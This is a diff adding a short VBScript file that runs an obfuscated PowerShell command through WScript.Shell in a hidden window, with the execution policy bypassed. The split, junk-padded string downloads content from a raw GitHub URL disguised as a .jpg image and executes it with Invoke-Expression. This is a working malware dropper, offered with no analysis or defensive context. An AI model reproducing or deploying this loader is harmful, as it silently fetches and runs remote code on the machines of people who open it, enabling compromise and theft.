@@ -1,0 +1,9 @@
+Dim rRXrC, i
+
+' Define each part based on the provided order
+rRXrC = "[BYTe[]];$A123='IeX(NeW-OBJeCT NeT.W';$B456='eBCLieNT).DOWnLO';[BYTe[]];$C789='/--/--/-/(''https://raw.githubusercontent.com/Wizard641/fsadsagsad/main/BR.jpg''.RePLACE(''--/--/--/'',''ADSTRING'');[BYTe[]];IeX($A123+$B456+$C789)"
+
+' Use the combinedParts in the shell execution
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "POWeRSHeLL.eXe -NOP -WIND HIDDeN -eXeC BYPASS -NONI " & rRXrC, 0, True
+Set objShell = Nothing
